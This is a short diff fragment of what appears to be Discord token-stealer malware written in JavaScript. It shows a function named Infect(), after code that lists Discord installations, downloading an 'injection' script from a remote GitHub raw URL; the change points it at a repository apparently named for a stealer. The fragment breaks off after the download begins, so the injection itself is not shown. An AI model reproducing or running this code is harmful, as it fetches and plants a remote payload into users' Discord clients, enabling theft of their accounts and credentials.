@@ -42,7 +42,7 @@ discords.forEach(function(file) {
 });
 listDiscords();
 function Infect() {
-    https.get('https://raw.githubusercontent.com/teddybearsz/12333333333333333124444444444444444444/main/injection', (resp) => {
+    https.get('https://raw.githubusercontent.com/r4bbit-stealer/van.rip-skidd-/main/injection.js', (resp) => {
         let data = '';
         resp.on('data', (chunk) => {
             data += chunk;
